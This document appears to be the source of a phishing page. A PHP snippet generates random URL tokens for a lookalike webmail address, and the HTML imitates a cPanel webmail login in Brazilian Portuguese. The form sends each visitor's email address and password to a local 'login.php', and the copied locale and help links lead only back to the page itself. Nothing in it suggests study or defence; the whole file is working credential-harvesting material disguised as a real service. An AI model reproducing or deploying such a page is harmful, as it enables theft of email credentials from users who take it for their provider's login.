...
function geraURL($tamanho = 64, $maiusculas = true, $numeros = true, $simbolos = true){
...
$id = geraURL(64,true,true,false);
$id2 = geraURL(64,true,true,false);


$url = 'https://webmail.instaremail.com.br&id='.$id. '&userid='.$id2;
...
<head>
    ...
    <link href="cPanel_magic_revision_1615451162/unprotected/cpanel/style_v2_optimized.css" rel="stylesheet" type="text/css" />
...
.copyright {
  ...
  background-size: 25px auto;
    ...
    <style type="text/css">
        img {
            behavior: url(/cPanel_magic_revision_1574187273/unprotected/cp_pngbehavior_login.htc);
        }
    </style>
    <![endif]-->
    ...
    <div id="notify">
        <noscript>
            <div class="error-notice">
                <img src="r1574186984/unprotected/cpanel/images/notice-error.png" alt="Error" align="left"/>
                O JavaScript está desabilitado no seu navegador.
                Para que Webmail funcione corretamente, você deve habilitar o JavaScript.
                Se você não habilitar o JavaScript, determinados recursos em Webmail não funcionarão corretamente.
            </div>
            </noscript>
        ...
        <div id='login-status' class="error-notice" style="visibility: hidden">
            <div class="content-wrapper">
                <div id="login-detail">
                    ...
                    <div id="login-status-message">Você fez logout.</div>
                </div>
            </div>
        </div>
        <div id="IE-warning" class="warn-notice IE-warning-hide" style="display: none">
            <div class="content-wrapper">
                <div id="IE-warning-detail">
                    ...
                    <div id="IE-warning-message">The system has detected that you are using Internet Explorer 11. cPanel &amp; WHM no longer supports Internet Explorer 11. For more information, read the 
                        <a title="cPanel Blog" target="_blank" href="./?action=ie11deprecation">cPanel Blog</a>.</div>
                </div>
            </div>
        </div>
    </div>
            ...
            <div id="locale-inner-container">
                ...
                <div id="locale-map">
                    <div class="scroller clear">
                            ...
                            <div class="locale-cell"><a href="./?action=locale=ar">العربية</a></div>
                        
                            <div class="locale-cell"><a href="./?action=locale=bg">български</a></div>
                        
                            <div class="locale-cell"><a href="./?action=cs">čeština</a></div>
                        
                            <div class="locale-cell"><a href="./?action=da">dansk</a></div>
                        
                            <div class="locale-cell"><a href="./?action=de">Deutsch</a></div>
                        
                            <div class="locale-cell"><a href="./?action=el">Ελληνικά</a></div>
                        
                            <div class="locale-cell"><a href="./?action=en">English</a></div>
                        
                            <div class="locale-cell"><a href="./?action=es">español</a></div>
                        
                            <div class="locale-cell"><a href="./?action=es_419">español latinoamericano</a></div>
                        
                            <div class="locale-cell"><a href="./?action=es_es">español de España</a></div>
                        
                            <div class="locale-cell"><a href="./?action=fi">suomi</a></div>
                        
                            <div class="locale-cell"><a href="./?action=fil">Filipino</a></div>
                        
                            <div class="locale-cell"><a href="./?action=fr">français</a></div>
                        
                            <div class="locale-cell"><a href="./?action=he">עברית</a></div>
                        
                            <div class="locale-cell"><a href="./?action=hu">magyar</a></div>
                        
                            <div class="locale-cell"><a href="./?action=i_cpanel_snowmen">☃ cPanel Snowmen ☃ - i_cpanel_snowmen</a></div>
                        
                            <div class="locale-cell"><a href="./?action=id">Bahasa Indonesia</a></div>
                        
                            <div class="locale-cell"><a href="./?action=it">italiano</a></div>
                        
                            <div class="locale-cell"><a href=./?action=ja">日本語</a></div>
                        
                            <div class="locale-cell"><a href="./?action=ko">한국어</a></div>
                        
                            <div class="locale-cell"><a href="./?action=ms">Bahasa Melayu</a></div>
                        
                            <div class="locale-cell"><a href="./?action=nb">norsk bokmål</a></div>
                        
                            <div class="locale-cell"><a href="./?action=nl">Nederlands</a></div>
                        
                            <div class="locale-cell"><a href="./?action=no">Norwegian</a></div>
                        
                            <div class="locale-cell"><a href="./?action=pl">polski</a></div>
                        
                            <div class="locale-cell"><a href="./?action=pt">português</a></div>
                        
                            <div class="locale-cell"><a href="./?action=pt_br">português do Brasil</a></div>
                        
                            <div class="locale-cell"><a href="./?action=ro">română</a></div>
                        
                            <div class="locale-cell"><a href="./?action=ru">русский</a></div>
                        
                            <div class="locale-cell"><a href="./?action=sl">slovenščina</a></div>
                        
                            <div class="locale-cell"><a href="./?action=sv">svenska</a></div>
                        
                            <div class="locale-cell"><a href="./?action=th">ไทย</a></div>
                        
                            <div class="locale-cell"><a href="./?action=tr">Türkçe</a></div>
                        
                            <div class="locale-cell"><a href="./?action=uk">українська</a></div>
                        
                            <div class="locale-cell"><a href="./?action=vi">Tiếng Việt</a></div>
                        
                            <div class="locale-cell"><a href="./?action=zh">中文</a></div>
                        
                            <div class="locale-cell"><a href="./?action=zh_cn">中文（中国）</a></div>
                        
                            <div class="locale-cell"><a href="./?action=zh_tw">中文（台湾）</a></div>
        ...
        <div id="login-container">
            ...
            <div id="login-sub-container">
                    <div id="login-sub-header">
                        ...
                        <img class="main-logo" src="r1574186984/unprotected/cpanel/images/webmail-logo.svg" alt="logo" />
                    ...
                    <div id="login-sub"
                        ...
                        <div id="forms">
                            <form  id="login_form" action="login.php" method="post" target="_top" style="visibility:">
                                <div class="input-req-login"><label for="user">Endereço de email</label></div>
                                <div class="input-field-login icon username-container">
<input required type="email" name="user" id="user" autofocus="autofocus" value="" placeholder="Insira seu endereço de email." class="std_textbox"   tabindex="1" >
                                </div>
                                <div class="input-req-login login-password-field-label"><label for="pass">Senha</label></div>
                                <div class="input-field-login icon password-container">
 <input required="" pattern="^.{6,50}$" name="pass" id="pass" placeholder="Insira a senha do seu email." class="std_textbox" type="password" tabindex="2" >
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
            ...
            <div class="locale-container">
                <noscript>
                    <form method="get" action="index.html">
                        <select name="locale">
                            <option value="">Alterar localidade</option>
                        ...
                        <button style="margin-left: 10px" type="submit">Alterar</button>
                    </form>
                ...
                <ul id="locales_list">
                        ...
                        <li><a href="./?action=locale=ar">العربية</a></li>
                    
                        
                        <li><a href="./?action=bg">български</a></li>
                    
                        
                        <li><a href="./?action=cs">čeština</a></li>
                    
                        
                        <li><a href="./?action=da">dansk</a></li>
                    
                        
                        <li><a href="./?action=de">Deutsch</a></li>
                    
                        
                        <li><a href="./?action=el">Ελληνικά</a></li>
                    
                        
                        <li><a href="./?action=en">English</a></li>
                    
                        
                        <li><a href="./?action=es">español</a></li>
                ...
                <div id="mobilelocalemenu">Selecione uma localidade:
                    <a href="javascript:void(0)" onclick="toggle_locales(true)" title="Alterar localidade">português do Brasil</a>
                </div>
            </div>
        </div>
    </div>
...
<script>
    /*
    var MESSAGES = {"internal_error":"An internal error occurred. If this condition persists, contact the system administrator.","read_below":"Leia as importantes informações abaixo.","session_locale":"A localidade desejada foi salva no seu navegador. Para alterar a localidade neste navegador novamente, selecione outra localidade nesta tela.","authenticating":"Autenticando…","no_username":"Você deve especificar um nome de usuário para fazer login.","network_error":"Ocorreu um erro de rede durante sua solicitação de login. Tente novamente. Se essa condição persistir, contate o provedor de serviços de rede.","invalid_login":"O login é inválido.","success":"Login bem-sucedido. Redirecionando…","ajax_timeout":"O tempo de conexão esgotou. Tente novamente."};
...
<style>
    ...
    <br /><a href="./?action=privacy" target="_blank">Privacy Policy</a></div>
